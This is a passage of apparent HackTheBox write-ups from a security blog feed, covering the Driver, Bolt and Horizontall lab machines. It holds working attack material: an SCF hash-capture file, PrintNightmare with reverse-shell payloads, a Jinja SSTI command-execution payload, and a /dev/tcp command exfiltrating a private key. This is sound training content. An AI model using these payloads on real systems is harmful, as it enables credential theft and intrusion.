<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>After a lot of googling as I am not very familiar with windows, I was introduced to SCF File Attacks. This attack can be exploited to capture SMB credentials by making authenticated users try to access an SMB service in an attackers control. I crafted a simple SCF file with the contents;</p>

<pre><code class="language-raw">[Shell]
Command=2
IconFile=\\10.10.14.95\Badshare\file.txt

[Taskbar]
command=ToggleDesktop
</code></pre>

<p>Note that <code class="language-plaintext highlighter-rouge">IconFile</code> points to an SMB service running on my attack host. I used the upload form in the website and uploaded it as <code class="language-plaintext highlighter-rouge">@exploit.scf</code>. The <code class="language-plaintext highlighter-rouge">@</code> symbol will move the file to the top of the share driver, or so I read, and it will be executed the moment a user browses the share.</p>

<p>With responder running on my attack host with the command <code class="language-plaintext highlighter-rouge">sudo responder -wrf --lm -v -I tun0</code>, I was able to capture the hash of a user named <strong>tony</strong>;</p>

<p><img src="/assets/img/20211027122030.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no problems cracking it;</p>

<p><img src="/assets/img/20211027122209.png" alt="" /></p>

<p>With the hash cracked, I had all I need to run <em>PrintNightmare</em>. I setup an SMB share with the name <em>Test</em> in a temporary directory on my attack host using Samba, and enabled anonymous logins. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the DLL payload required by the exploit, and moved it into the root directory of the SMB share. The exploit ran through all it’s three (3) stages, but I couldn’t get a connection back. Running <code class="language-plaintext highlighter-rouge">inotifywait -e CLOSE meterpreter.dll</code> showed that the DLL was read when running the exploit.</p>

<p>The payload I initially used was <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code>, so I changed it to <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code>;</p>

<p><img src="/assets/img/20211027171430.png" alt="" /></p>

<p>Running the exploit again, I got a high privilege shell on the box, sparing me the need for any sort of privesc;</p>

<p><img src="/assets/img/20211027171557.png" alt="" /></p>

<p><img src="/assets/img/20211027171647.png" alt="" /></p>

<p><img src="/assets/img/20211027171750.png" alt="" /></p>

<p>I found the user flag inside <code class="language-plaintext highlighter-rouge">C:\Users\tony\Desktop</code>, and the root flag in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>.</p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Got a login form on the website, which accept the credential <code class="language-plaintext highlighter-rouge">admin:admin</code></li>
  <li>Found a firmware update page in the admin panel that allows for file upload.</li>
  <li>Performed an SCF File Attack to capture the SMB hash of a user named <strong>tony</strong> using <code class="language-plaintext highlighter-rouge">responder</code>, and cracked it using <code class="language-plaintext highlighter-rouge">john</code>.</li>
  <li>Ran a <em>PrintNightmare</em> exploit on the target to gain a privileged access on the box.</li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="windows" /><category term="smb" /><category term="scf file attack" /><category term="print nightmare" /><category term="responder" /><category term="metasploit" /><category term="msfvenom" /><category term="smb" /><summary type="html"><![CDATA[Driver is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an SCF File Attack to capture and crack the password of a local user using responder. After cracking the hash, you can exploit the Print Nightmare vulnerability to gain a privileged access to the box.]]></summary></entry><entry><title type="html">Bolt - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/bolt.html" rel="alternate" type="text/html" title="Bolt - HackTheBox" /><published>2022-02-19T00:00:00+01:00</published><updated>2022-02-19T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/bolt</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/bolt.html"><![CDATA[<p><strong>Bolt</strong> is a very interesting <em>medium</em> linux box featuring some heavy enumeration. For foothold, you exploit a web page that’s vulnerable to <strong>SSTI</strong>. After some enumeration, you will find a MySQL credential in a configuration file, which will give you access to a local user. For privilege escalation, you will take advantage of a <em>chrome</em> extension that dumps GPG keys into it’s logs on disk.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211022084723.png" alt="" /></p>

<p><img src="/assets/img/20211022084802.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Fri Oct 22 08:49:31 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.114
Increasing send delay for 10.10.11.114 from 0 to 5 due to 39 out of 129 dropped probes since last increase.
Nmap scan report for 10.10.11.114
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
|_SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 22 08:50:21 2021 -- 1 IP address (1 host up) scanned in 50.17 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>The website presents itself as <em>a large User Interface Kit that will help you prototype and design beautiful, creative and modern websites</em>.</p>

<p><img src="/assets/img/20211022085623.png" alt="" /></p>

<p>Detected web technologies;</p>

<p><img src="/assets/img/20211022090455.png" alt="" /></p>

<p><img src="/assets/img/20211022085700.png" alt="" /></p>

<p>The footer of the box mentioned the name of the box authors, so this is likely a custom website;</p>

<p><img src="/assets/img/20211022085848.png" alt="" /></p>

<p>Requesting a wrong path in the host returned an interesting title;</p>

<p><img src="/assets/img/20211022092454.png" alt="" /></p>

<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code>, I found a few paths;</p>

<p><img src="/assets/img/20211022085952.png" alt="" /></p>

<p>Going to the contact page, I found a web form and two email addresses; <code class="language-plaintext highlighter-rouge">support@bolt.htb</code>, and <code class="language-plaintext highlighter-rouge">sales@bolt.htb</code>. Using the contact form generated a GET request with no parameters. Checking the source of the form showed that the form is not complete;</p>

<p><img src="/assets/img/20211022091431.png" alt="" /></p>

<p>Checking the pricing page showed an interesting entry;</p>

<p><img src="/assets/img/20211022091714.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">/download</code> path gave me a link to download a docker image at http://bolt.htb/uploads/image.tar</p>

<p>At the <code class="language-plaintext highlighter-rouge">/services</code> page there is a field to submit an email address to “get access to freebies &amp; premium products”. This form also doesn’t do anything.</p>

<p>The page at <code class="language-plaintext highlighter-rouge">/login</code> provides an authentication form. Manual fuzzing using burp’s repeater didn’t yield anything. But there is an option to register an account on the page;</p>

<p><img src="/assets/img/20211022093706.png" alt="" /></p>

<p>Sending a request to create an account, however, resulted in a <strong>500 Internal Server Error</strong>;</p>

<p><img src="/assets/img/20211022094030.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">ffuf</code> previously found two pages <code class="language-plaintext highlighter-rouge">/register</code> and <code class="language-plaintext highlighter-rouge">sign-up</code> that I assumed are the same pages because their contents looked similar. Both are used to create an account, but while <code class="language-plaintext highlighter-rouge">/register</code> gave a <strong>500</strong> HTTP error, <code class="language-plaintext highlighter-rouge">/sign-up</code> gave a different response;</p>

<p><img src="/assets/img/20211022094844.png" alt="" /></p>

<p><img src="/assets/img/20211022094909.png" alt="" /></p>

<p>Changing the request method from POST to GET solved the <strong>500</strong> error, but I was not able to login using the credentials submitted, so this functionality is probably not fully implemented too.</p>

<p>Going to the <code class="language-plaintext highlighter-rouge">/check-email</code> path discovered earlier, I got this;</p>

<p><img src="/assets/img/20211022100017.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="passbolt">Passbolt</h3>
<p><br /></p>

<p>NMAP earlier identified a web service on port <strong>443</strong> (HTTPs) with the name <strong>passbolt.bolt.htb</strong>. Loading the page, it presents itself as an open source password manager;</p>

<p><img src="/assets/img/20211022102528.png" alt="" /></p>

<p>Submitting email addresses in the field gave the error;</p>

<p><img src="/assets/img/20211022104014.png" alt="" /></p>

<p>I found the <em>GitHub</em> repo of the web app at https://github.com/passbolt/passbolt_api. The applications looks pretty solid, so I decided to ignore it.</p>

<p><br /></p>

<hr />
<h3 id="docker">Docker</h3>
<p><br /></p>

<p>I downloaded the docker image from the site at http://bolt.htb/download. The image is a <em>.tar</em> archive, which is the format used to export docker containers. Using the <code class="language-plaintext highlighter-rouge">docker import</code> command, I was able to import the docker image on my local host, but I was unable to run any command on it, saying <strong>executable file not found in $PATH</strong> for relative paths, or <strong>no such file or directory</strong> for absolute paths;</p>

<p><img src="/assets/img/20211023093435.png" alt="" /></p>

<p>Since the image is just a <em>.tar</em> archive of the file system of the docker container, I extracted it using the command <code class="language-plaintext highlighter-rouge">tar -xvf image.tar</code> and go through the extracted files manually. I found the source code of the web application, and an <em>sqlite</em> database containing the password hash of the user <code class="language-plaintext highlighter-rouge">admin@bolt.htb</code>;</p>

<p><img src="/assets/img/20211023093758.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, I was able to crack it;</p>

<p><img src="/assets/img/20211023094127.png" alt="" /></p>

<p>Giving the email address to the <em>passbolt</em> domain said the email was not associated with any approved user in the domain. But the credential worked on the main <em>bolt.htb</em> domain, and I gained access to the admin dashboard;</p>

<p><img src="/assets/img/20211023100755.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Most of the links in the admin dashboard are dead. I did find a few messages exchanged between some <em>Alexander Pierce</em> and <em>Sarah Bullock</em> in which they were talking about a security concern regarding emails;</p>

<p><img src="/assets/img/20211023150957.png" alt="" /></p>

<p>Sarah saying the demo is restricted to invites only made me believe this is the reason I couldn’t create an account on the web application. Going through the source code of the web application extracted from the docker image, the file <code class="language-plaintext highlighter-rouge">app/base/routes.py</code> was found to contain the code used to create an account. The code validates account creation requests using the parmater <code class="language-plaintext highlighter-rouge">invite_code</code> that must be equal to <code class="language-plaintext highlighter-rouge">XNSS-HSJW-3NGU-8XTJ</code>;</p>

<p><img src="/assets/img/20211023151905.png" alt="" /></p>

<p>So I made a request to create an account through <em>Burp Suite</em> and added the invite code, but it still gave me a <strong>500</strong> error. Testing the invite code on the <strong>passbolt.bolt.htb</strong> domain also didn’t work. This didn’t make much sense, and made me believe the source code I am auditing may actually be for a different service. So I used <code class="language-plaintext highlighter-rouge">ffuf</code> to fuzz for hidden subdomains again, and I got 2 hits (the last 3 were due to <code class="language-plaintext highlighter-rouge">ffuf</code> bugging out after I hit <code class="language-plaintext highlighter-rouge">CTRL + C</code>);</p>

<p><img src="/assets/img/20211023162622.png" alt="" /></p>

<p>Going to the <strong>demo</strong> page, I got a login form;</p>

<p><img src="/assets/img/20211023205421.png" alt="" /></p>

<p>Although the form looks much like the one on the <strong>bolt.htb/login</strong> page, I was unable to login using the credential of <code class="language-plaintext highlighter-rouge">admin:deadbolt</code>. The site allows for account registration that accepts invite code, and I was able to create an account using the invite code previously obtained. The form required an email address ending with <strong>@bolt.htb</strong>, and I was able to supply a fake one as the web app does not appear to be validating emails. After logging in, I got a similar dashboard to the previous one, but this one has more features;</p>

<p><img src="/assets/img/20211023210406.png" alt="" /></p>

<p>The page at http://mail.bolt.htb also gave me a login form. Using the credentials of <code class="language-plaintext highlighter-rouge">admin:deadbolt</code>, I got an error message that says <strong>Connection to storage server failed</strong>. Googling this error showed that it happens usually due to configuration errors. Using the test credentials I used to access <strong>demo</strong> subdomain, I was able to login to the webmail application. This means the web app is creating an email account for every user that signed up on the demo page;</p>

<p><img src="/assets/img/20211023211507.png" alt="" /></p>

<p>Earlier I read some messages exchanged between <em>Alexander Pierce</em> and <em>Sarah Bullock</em> about a security concern regarding emails, so I decided to focus on this webmail. The webmail was identified as <strong>RoundCube 1.4.6</strong>;</p>

<p><img src="/assets/img/20211023212233.png" alt="" /></p>

<p>I found a couple of links online saying this version of the webmail is vulnerable to XSS. My first thought was to target other users through emails, but I can’t send an email as it keeps giving me an <code class="language-plaintext highlighter-rouge">SMTP Error (-1): Connection to server failed</code>.</p>

<p>Going back to the <strong>demo</strong> portal, I have an option to update my profile, which sends a confirmation email to my account in the <strong>mail</strong> portal with a link to click to confirm changes. So I decided to look at how the functionality is implemented in the extracted source code, and found something very interesting. The way the web application generates the email sent to users to inform them about the changes made could be vulnerable to <em>Server Side Template Injection (SSTI)</em>;</p>

<p><img src="/assets/img/20211024094415.png" alt="" /></p>

<p>As can be seen in the image above, the <strong>name</strong> submitted during profile edit is injected directly into the template in the file <code class="language-plaintext highlighter-rouge">templates/emails/update-name.html</code>;</p>

<p><img src="/assets/img/20211024094617.png" alt="" /></p>

<p>Testing the <strong>name</strong> field using the SSTI payload <code class="language-plaintext highlighter-rouge">name{{10*10}}</code>, the web app evaluated the <code class="language-plaintext highlighter-rouge">{{10*10}}</code> expression and replaced it with the result, which is <code class="language-plaintext highlighter-rouge">100</code>;</p>

<p><img src="/assets/img/20211024094757.png" alt="" /></p>

<p>Multiple attempts to execute code or read local files kept giving me a <strong>500 Internal server error</strong>. Using the <code class="language-plaintext highlighter-rouge">{{config.items()}}</code> payload, I obtained some data about the service;</p>

<p><img src="/assets/img/20211024102518.png" alt="" /></p>

<p>Using the payload <code class="language-plaintext highlighter-rouge">{{"".__class__.__mro__[1].__subclasses__()}}</code>, I dumped the accessible classes, and found <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>, which can be used to execute system commands;</p>

<p><img src="/assets/img/20211024114602.png" alt="" /></p>

<p>The index of <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> in the returned list was found to be <strong>222</strong>. This is all the info that is needed to gain code execution on the server. After testing using a local python3 installation, I was able to gain command execution on the host using the payload;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span><span class="s">""</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">222</span><span class="p">].</span><span class="n">__call__</span><span class="p">([</span><span class="s">"ping"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"10"</span><span class="p">,</span> <span class="s">"10.10.14.95"</span><span class="p">])}}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20211024120326.png" alt="" /></p>

<p>Directly injection a bash reverse shell kept failing for some reasons, so I just dropped a bash script on the target host using <code class="language-plaintext highlighter-rouge">curl</code>, and ran it;</p>

<p><img src="/assets/img/20211024124315.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Inside the host as <code class="language-plaintext highlighter-rouge">www-data</code>, I found two local users: <strong>eddie</strong>, and <strong>clark</strong>. I obtained credentials for the <em>RoundCube</em> and <em>demo</em> web apps in their configration files for the local MySQL server, but nothing of interest was found inside.</p>

<p>There is an IMAP service running locally, so I started testing the credentials I obtained in the docker image and the configuration files of the web apps. For the user <strong>admin</strong> account, I got an internal error;</p>

<p><img src="/assets/img/20211024203825.png" alt="" /></p>

<p>All the other credentials I have at this point did not work for any account. So I kept going through the filesystem in hope of finding new ones, and I did. The file <code class="language-plaintext highlighter-rouge">/etc/passbolt/passbolt.php</code> contains a MySQL credential;</p>

<p><img src="/assets/img/20211024213330.png" alt="" /></p>

<p>Using the above credential, I got access to the database <code class="language-plaintext highlighter-rouge">passboltdb</code>. Testing for password reuse, I got access to <strong>eddie</strong>’s account;</p>

<p><img src="/assets/img/20211024213942.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>eddie</strong> does not have <code class="language-plaintext highlighter-rouge">sudo</code> permissions to anything. Enumerating the database used by <em>passbolt</em>, I found the public GPG keys of both <strong>eddie</strong> and <strong>clark</strong>, along with a message that was encrypted with the public key of <strong>eddie</strong>, which means I need his private key to decrypt it;</p>

<p><img src="/assets/img/20211025073726.png" alt="" /></p>

<p>Checking his email file at <code class="language-plaintext highlighter-rouge">/var/mail/eddie</code> that I couldn’t access earlier, I saw an interesting message from <strong>clark</strong>;</p>

<p><img src="/assets/img/20211024214358.png" alt="" /></p>

<p>There is a <em>Google Chrome</em> browser at <code class="language-plaintext highlighter-rouge">/opt/chrome</code>, and the SSH server has X11 forwarding enabled. So I launched chrome on the host, and saw a plugin icon for <em>passbolt</em> plugin. Clicking on it launched the plugin, but it stuck like that, saying <code class="language-plaintext highlighter-rouge">Connecting to your account</code>.</p>

<p>Since <strong>clark</strong> has told <strong>eddie</strong> to backup his private key, I assumed the private key is saved somewhere on disk, so I searched the whole filesystem using <code class="language-plaintext highlighter-rouge">grep</code> for GPG private key files, and found a match at <code class="language-plaintext highlighter-rouge">/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log</code>. I shipped the file to my attack host for analysis. Going through the file in <code class="language-plaintext highlighter-rouge">vim</code>, I was able to extract a private key belonging to <strong>eddie</strong>.</p>

<p>Attempt to import the private key using <code class="language-plaintext highlighter-rouge">gpg</code> failed because the key file is password-protected. I tried all the passwords discovered earlier, and none worked. So I used <code class="language-plaintext highlighter-rouge">gpg2john</code> to convert the key file to a hash that can be bruteforced by <code class="language-plaintext highlighter-rouge">john</code>, and bruteforced it with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. It took a while, but the password was cracked;</p>

<p><img src="/assets/img/20211025170328.png" alt="" /></p>

<p>Using the password, I was able to import the private key file, and decrypt the message;</p>

<p><img src="/assets/img/20211025170709.png" alt="" /></p>

<p>Using the credential highlighted above, I was able to access the account of the root user;</p>

<p><img src="/assets/img/20211025171008.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found a local installation of <em>Passbolt</em> password manager at https://passbolt.bolt.htb</li>
  <li>Enumerated the docker image provided by the site, and found a credential for <em>admin@bolt.htb</em>, which gave me access to the admin dashboard at http://bolt.htb/admin/home</li>
  <li>Found an invite code in the source code of http://demo.bolt.htb, which I used to create an account on http://demo.bolt.htb, and gained access to the admin dashboard.
    <ul>
      <li>Sigining up on the <em>demo</em> portal auto-creates an account on <em>mail</em> portal.</li>
      <li>Exploited an SSTI flaw on <em>mail</em> portal to gain a foothold into the box as <code class="language-plaintext highlighter-rouge">www-data</code>.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Identified 2 local users; <strong>eddie</strong>, and <strong>clark</strong></li>
      <li>Found MySQL credentials used by <em>Passbolt</em> in <code class="language-plaintext highlighter-rouge">/etc/passbolt/passbolt.php</code>, which gave me access to the account of <strong>eddie</strong>, and the user flag.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>eddie</strong>;
    <ul>
      <li>Found an email from <strong>clark</strong> at <code class="language-plaintext highlighter-rouge">/var/mail/eddie</code>, advising <strong>eddie</strong> to backup his GPG key.</li>
      <li>Found a message in the table <code class="language-plaintext highlighter-rouge">secrets</code> in the MySQL database used by <em>passbolt</em>. The message was encrypted using <strong>eddie</strong>’s public key.</li>
      <li>Found the private key of <strong>eddie</strong> inside a log file created by Chrome inside his home directory.</li>
      <li>The private key was password protected, so I had to crack it using <code class="language-plaintext highlighter-rouge">john</code>.</li>
      <li>Finally, I used the cracked private key to decrypt the encrypted message, which was found to contain a password. The password gave access to the <strong>root</strong> account.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="docker" /><category term="gpg" /><category term="ssti" /><category term="hash cracking" /><category term="passbolt" /><category term="webmail" /><category term="roundcube" /><summary type="html"><![CDATA[Bolt is a very interesting medium linux box featuring some heavy enumeration. For foothold, you exploit a web page that’s vulnerable to SSTI. After some enumeration, you will find a MySQL credential in a configuration file, which will give you access to a local user. For privilege escalation, you will take advantage of a chrome extension that dumps GPG keys into it’s logs on disk.]]></summary></entry><entry><title type="html">Horizontall - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/horizontall.html" rel="alternate" type="text/html" title="Horizontall - HackTheBox" /><published>2022-02-05T00:00:00+01:00</published><updated>2022-02-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/horizontall</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/horizontall.html"><![CDATA[<p><strong>Horizontall</strong> is an easy linux box featuring two RCEs. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a <em>Laravel</em> instance running locally, which is also vulnerable to <em>RCE</em>, and will give you access to the box as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h3 id="about">About</h3>
<p><br /></p>

<ul>
  <li><em>OS</em> - Linux</li>
  <li><em>Difficulty</em> - Easy</li>
  <li><em>Points</em> - 20</li>
  <li><em>Release</em> - 28/Aug/2021</li>
  <li><em>IP</em> - 10.10.11.105
<br /></li>
</ul>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">Nmap</h4>

<pre><code class="language-raw">Nmap scan report for 10.10.11.105
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
</code></pre>

<p>Homepage of the web service;</p>

<p><img src="/assets/img/20210928115638.png" alt="" /></p>

<p>Technologies detected by <em>Wappalyzer</em>;</p>

<p><img src="/assets/img/20210928115701.png" alt="" /></p>

<p>The web page contains a few buttons/links, including a contact-us form, none of which do anything.</p>

<p>Viewing the source code of the file indicate it’s being dynamically generated using JavaScript, with 2 JavaScript files being imported;</p>

<p><img src="/assets/img/20210928212140.png" alt="" /></p>

<p>The first JS file is pretty large at about 1.2 MB in size. The second one is only 20 KB in size. The JS codes have a mangled syntax, and had to be formatted using <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. About 2 minutes into skimming through the code, I discovered a subdomain on the site;</p>

<p><img src="/assets/img/20210928212747.png" alt="" /></p>

<p>I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with the new host, and was able to connect;</p>

<p><img src="/assets/img/20210928213116.png" alt="" />
<br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Searching for one of the web technologies identified by <em>Wappalyzer</em> on the host <strong>api-prod.horizontall.htb</strong> using <code class="language-plaintext highlighter-rouge">searchsploit</code> revealed some interesting flaws;</p>

<p><img src="/assets/img/20210928213504.png" alt="" /></p>

<p><img src="/assets/img/20210928213438.png" alt="" /></p>

<p>Using the last exploit shown above, I was able achieve blind command-injection on the host;</p>

<p><img src="/assets/img/20210928214332.png" alt="" /></p>

<p>I then used it to spawn a bash reverse shell;</p>

<p><img src="/assets/img/20210928214641.png" alt="" /></p>

<p>A user named <code class="language-plaintext highlighter-rouge">developer</code> exists, and I was able to obtain the user flag using the <em>strapi</em> account;</p>

<p><img src="/assets/img/20210928214945.png" alt="" /></p>

<p>The user flag file is the only thing readable to the <em>strapi</em> account inside <strong>developer</strong>’s home directory, so I continue to explore the system to find something of use. Inside the <em>strapi</em> installation folder in <code class="language-plaintext highlighter-rouge">/opt/strapi</code>, I found a JSON file with credentials for the <code class="language-plaintext highlighter-rouge">developer</code> user <code class="language-plaintext highlighter-rouge">developer:#J!:F9Zt2u</code>;</p>

<p><img src="/assets/img/20210928215956.png" alt="" /></p>

<p>The config seems to be for MySQL server, and <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL server is running locally, along with some strange service on port <strong>1337</strong>;</p>

<p><img src="/assets/img/20210928220206.png" alt="" /></p>

<p>Attempt to login to the developer account via SSH using the credential found failed. I was able to access the backend MySQL server using the above credential, but found nothing of interest.</p>

<p>Using <code class="language-plaintext highlighter-rouge">curl</code>, the service on port <strong>1337</strong> was identified to be the web app discovered on <strong>http://api-prod.horizontall.htb/</strong>, while the service on port <strong>8000</strong> was identified as a <em>Laravel</em> installation by downloading the home page using <code class="language-plaintext highlighter-rouge">curl</code> on the target host and shipping it to my attack host using <code class="language-plaintext highlighter-rouge">netcat</code>.</p>

<p><img src="/assets/img/20210928222028.png" alt="" /></p>

<p>I then created an SSH key file for the <em>strapi</em> user manually because the bash session through <code class="language-plaintext highlighter-rouge">netcat</code> is unstable, and shipped the private key to my attack box using the commands;</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c"># On attacking machine (a netcat listener to save the file)</span>
<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> 443 <span class="o">&gt;</span> id_rsa

<span class="c"># On target machine in the home of strapi</span>
<span class="nv">$ </span>ssh-keygen <span class="c"># Create the keys</span>
<span class="nv">$ </span><span class="nb">cd</span> .ssh/
<span class="nv">$ </span><span class="nb">cp </span>id_rsa.pub authorized_keys <span class="c"># Enable the key.</span>
<span class="nv">$ </span><span class="nb">cat </span>id_rsa <span class="o">&gt;</span> /dev/tcp/10.10.14.31/443 <span class="c"># Push it to my box</span>

<span class="c"># On attacking machine</span>
<span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa <span class="c"># Required by the ssh client</span>
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa strapi@horizontall.htb <span class="c"># Connect using the key</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It worked and I gained SSH access to the box as <em>strapi</em>. Using the SSH access, I set up local port-forwarding from my host on port <strong>8000</strong> to the <em>Laravel</em> service on port <strong>8000</strong> on the target host;</p>

<p><img src="/assets/img/20210928225632.png" alt="" />
<br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>A quick search found a promising RCE exploit for the version of <em>Laravel</em> running (version 8), but couldn’t use it as it required absolute path of <em>Laravel</em> running on the host, which I didn’t know;</p>

<p><img src="/assets/img/20210928231740.png" alt="" /></p>

<p>I was able to obtain the web root by querying <code class="language-plaintext highlighter-rouge">/profiles</code>, a file I read about while reading a post on <em><a href="https://book.hacktricks.xyz">hacktricks</a></em> on <em>Laravel</em> debug mode exploitation, on the web app;</p>

<p><img src="/assets/img/20210929075303.png" alt="" /></p>

<p>I was able to get the exploit working on first try using the discovered web root for <em>Laravel</em>;</p>

<p><img src="/assets/img/20210929080219.png" alt="" /></p>

<p>Using my SSH access to <em>strapi</em> user, I downloaded a bash reverse shell from a web service running on my attack host, saved it as <code class="language-plaintext highlighter-rouge">/dev/shm/bash_rev.sh</code>, made it executable, and execute it using the <em>Laravel</em> exploit. I took this approach because directly executing the bash reverse shell code using the <em>Laravel</em> exploit kept failing. This gave me root access to the box;</p>

<p><img src="/assets/img/20210929082849.png" alt="" /></p>

<p><img src="/assets/img/20210929082140.png" alt="" />
<br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services using NMAP.</li>
  <li>Found a web app that relies heavily on JavaScript to dynamically generate contents, all of which are imported from .js files.</li>
  <li>Downloaded the .js files for code analysis, which revealed a hidden virtual host running a web service at <strong>api-prod.horizontall.htb</strong>
    <ul>
      <li><em>Wappalyzer</em> identified a CMS named <strong>strapi</strong>, and a search using <code class="language-plaintext highlighter-rouge">searchploit</code> revealed an RCE flaw, using which a remote shell was obtained on the host as the user <code class="language-plaintext highlighter-rouge">strapi</code>.</li>
    </ul>
  </li>
  <li>Inside the box as the user <code class="language-plaintext highlighter-rouge">strapi</code>;
    <ul>
      <li>User account with the name <code class="language-plaintext highlighter-rouge">developer</code> was identified, and the user flag was obtained from his/her root directory.</li>
      <li>Identified a service running locally on port <strong>8000</strong> as <strong>Laravel</strong> version 8, which is vulnerable to <em>RCE</em>.</li>
